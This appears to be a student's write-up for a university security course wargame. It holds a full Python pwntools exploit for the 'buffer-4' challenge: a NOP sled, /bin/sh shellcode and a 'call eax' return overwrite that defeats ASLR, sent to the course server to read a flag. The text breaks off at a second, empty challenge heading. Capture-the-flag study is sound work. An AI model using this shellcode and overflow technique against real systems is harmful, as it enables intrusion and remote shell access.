# **COMP6447 Wargame 3** - Johnathan Liauw (z5136212)
## **1. buffer-4 - shellz**
_General Overview of Problems faced:_
None

_List of vulnerabilities:_
1. User's input can overflow the buffer and overwrite the return address

_Steps to exploit:_
1. Find the offset to overwrite the return address
2. From the binary, I know that the buffer address is still stored in eax when the program returns, therefore I can use a _"call eax"_ gadget to beat ASLR

_Script/Command used:_
```python
#!/usr/bin/python 

from pwn import *

host = "wargames.6447.sec.edu.au"
port = 5004

offset = 8204
call_eax = 0x08048406

c = remote(host, port)

payload = "\x90"*8000 
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 
payload += "a"*181
payload += p32(call_eax)

log.info("Sending payload...")

c.sendline(payload)
c.recvlines(2)
c.sendline("cat /flag")
log.success("Flag: %s" %(c.recvuntil('\n')))

c.close()
```
---
## **2. canary-3 - stack-dump**

